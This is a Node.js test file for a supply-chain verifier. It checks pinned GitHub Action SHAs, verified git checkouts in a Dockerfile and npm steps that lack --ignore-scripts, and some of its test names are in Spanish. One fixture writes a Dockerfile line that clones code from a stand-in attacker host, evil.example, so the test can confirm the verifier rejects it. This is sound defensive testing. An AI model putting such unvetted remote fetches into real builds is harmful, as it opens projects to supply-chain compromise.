'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');

const {
  SKILL_SHIELDER_REVISION,
  SKILL_SHIELDER_URL,
  verifySupplyChain,
} = require('../scripts/verify-supply-chain.js');

const CHECKOUT_SHA = '11bd71901bbe5b1630ceea73d27597364c9af683';

function fixture(t, { actionReference, cloneVerification = true } = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agile-sddf-supply-'));
  const workflows = path.join(root, '.github', 'workflows');
  fs.mkdirSync(workflows, { recursive: true });
  fs.writeFileSync(path.join(workflows, 'ci.yml'), [
    'name: CI',
    'jobs:',
    '  verify:',
    '    steps:',
    `      - uses: ${actionReference || `actions/checkout@${CHECKOUT_SHA} # v4.2.2`}`,
  ].join('\n'), 'utf8');
  const verification = cloneVerification
    ? [
      `ARG SKILL_SHIELDER_REVISION=${SKILL_SHIELDER_REVISION}`,
      `RUN git clone --no-checkout ${SKILL_SHIELDER_URL} /opt/shielder \\\n    && git -C /opt/shielder checkout --detach "$SKILL_SHIELDER_REVISION" \\\n    && test "$(git -C /opt/shielder rev-parse HEAD)" = "$SKILL_SHIELDER_REVISION"`,
    ].join('\n')
    : `RUN git clone ${SKILL_SHIELDER_URL} /opt/shielder`;
  fs.writeFileSync(path.join(root, 'Dockerfile.dev'), [
    'FROM debian:bookworm-slim@sha256:0104b334637a5f19aa9c983a91b54c89887c0984081f2068983107a6f6c21eeb',
    verification,
  ].join('\n'), 'utf8');
  t.after(() => fs.rmSync(root, { recursive: true, force: true, maxRetries: 3 }));
  return root;
}

test('accepts full Action SHAs and a verified immutable Skill Shielder checkout', (t) => {
  const root = fixture(t);
  const result = verifySupplyChain({ repoRoot: root });
  assert.deepEqual(result.errors, []);
});

test('rejects an Action tag and a remote clone without a verified SHA', (t) => {
  const root = fixture(t, { actionReference: 'actions/checkout@v4', cloneVerification: false });
  const result = verifySupplyChain({ repoRoot: root });
  assert.ok(result.errors.some((error) => /full 40-character commit SHA/.test(error)));
  assert.ok(result.errors.some((error) => /human release comment/.test(error)));
  assert.ok(result.errors.some((error) => /revision must be/.test(error)));
  assert.ok(result.errors.some((error) => /check out the declared immutable revision/.test(error)));
});

test('rechaza un clone remoto no allowlisted aunque use --no-checkout', (t) => {
  const root = fixture(t);
  const dockerfile = path.join(root, 'Dockerfile.dev');
  fs.writeFileSync(dockerfile, [
    'FROM debian:bookworm-slim@sha256:0104b334637a5f19aa9c983a91b54c89887c0984081f2068983107a6f6c21eeb',
    'RUN git clone --no-checkout https://evil.example/shielder.git /tmp/shielder',
  ].join('\n'), 'utf8');

  const result = verifySupplyChain({ repoRoot: root });
  assert.ok(result.errors.some((error) => /evil\.example\/shielder\.git.*allowlist/.test(error)));
});

test('rechaza npm ci/install/pack sin --ignore-scripts en un workflow', (t) => {
  const root = fixture(t);
  fs.appendFileSync(path.join(root, '.github', 'workflows', 'ci.yml'), '\n      - run: npm pack --dry-run\n', 'utf8');

  const result = verifySupplyChain({ repoRoot: root });
  assert.ok(result.errors.some((error) => /npm pack debe usar --ignore-scripts/.test(error)));
});
